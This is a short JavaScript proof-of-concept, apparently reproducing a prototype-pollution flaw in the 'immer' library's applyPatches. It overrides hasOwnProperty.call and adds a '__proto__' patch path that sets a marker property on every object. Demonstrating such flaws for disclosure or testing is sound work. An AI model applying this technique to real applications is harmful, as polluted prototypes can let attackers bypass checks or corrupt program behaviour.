Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const {applyPatches, enablePatches} = require('immer');
enablePatches();
applyPatches({}, [{
        op: 'add',
        path: [
            '__proto__',
            'polluted'
        ],
        value: 'yes'
    }]);
console.log({}.polluted);